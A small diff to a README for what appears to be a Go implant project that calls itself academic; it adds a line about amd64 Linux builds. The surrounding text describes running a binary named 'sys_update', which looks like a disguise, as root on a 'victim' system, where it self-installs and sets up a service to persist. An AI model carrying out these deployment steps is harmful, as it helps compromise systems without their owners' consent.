@@ -13,7 +13,8 @@ This project is for academic purposes only and is not intended for malicious use
 To compile the binary, you must have Go installed.
 
 To compile, run the `build.sh` script in this repo.
-Two binaries will be created: `sys_update` and `controller`
+Two binaries will be created: `sys_update` and `controller`.
+These are compiled for any linux system with amd64 architecture.
 
 Transfer `sys_update` to any directory on the target/victim system, and then run as root.
 The binary will auto install itself into `/usr/local/bin/`, create a service to persist across
